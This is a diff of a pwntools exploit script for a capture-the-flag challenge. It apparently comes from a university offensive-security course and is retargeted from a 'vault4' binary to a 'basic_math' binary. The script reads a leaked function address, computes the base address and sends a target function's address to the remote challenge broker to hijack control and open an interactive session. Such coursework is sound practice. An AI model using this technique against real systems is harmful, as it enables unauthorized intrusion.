@@ -1,26 +1,26 @@
 from pwn import *
 
-context.log_level = "info"
+context.log_level = "debug"
+context.terminal = ["tmux", "splitw", "-f", "-h"]
 
-LOCAL = True
-source_address_name = "fake_vault"
-target_address_name = "secret_vault"
+LOCAL = False
+source_address_name = "totally_uninteresting_function"
+target_address_name = "add"
 
 if LOCAL:
-    p = process("./vault4")
-    libc = "./vault4"
+    p = process("./basic_math")
+    libc = "./basic_math"
 else:
-    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1234)
+    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1245)
     p.recvuntil(b"abc123):")
     p.sendline(b"nam10102")
-    libc = "./vault4"
+    libc = "./basic_math"
 
 # Extract the given address from the message and read up until expected input
-print(p.recvuntil(b"at: ").decode())
+print(p.recvuntil(b"somewhere: ").decode())
 source_raw_address = p.recvline().strip()
-print(p.recvuntil(b">").decode())
+
 print(f"{source_address_name:<15} raw         : {source_raw_address}")
-source_address = int.from_bytes(source_raw_address, byteorder="little")
 source_address = u64(source_raw_address)
 print(f"{source_address_name:<15} address     : {hex(source_address)}")
 
@@ -36,24 +36,21 @@ base_address = source_address - source_address_offset
 print(f"{'base address':<15}             : {hex(base_address)}")
 
 # Get the offset for the target address
-target_address_offset = e.symbols[target_address_name]
+target_address_offset = 0x1285
 print(f"{target_address_name:<15} offset      : {hex(target_address_offset)}")
+
 
 # Compute the target address (address = base + offset)
 target_address = base_address + target_address_offset
 print(f"{target_address_name:<15} address     : {hex(target_address)}")
 
 # This challenge required raw bytes
-target_address_raw = target_address.to_bytes((target_address.bit_length() + 7) // 4,
-                                             byteorder='little')
 target_address_raw = p64(target_address)
 print(f"{target_address_name:<15} address raw : {target_address_raw}")
 
-# Send the answer
+# Get to prompt and send the answer
+print(p.recvuntil(b">").decode())
 p.sendline(target_address_raw)
 
 # Reap the rewards
-print(p.recvline().decode())
-print(p.recvline().decode())
-print(p.recvline().decode())
-print(p.recvline().decode())
+print(p.interactive().decode())
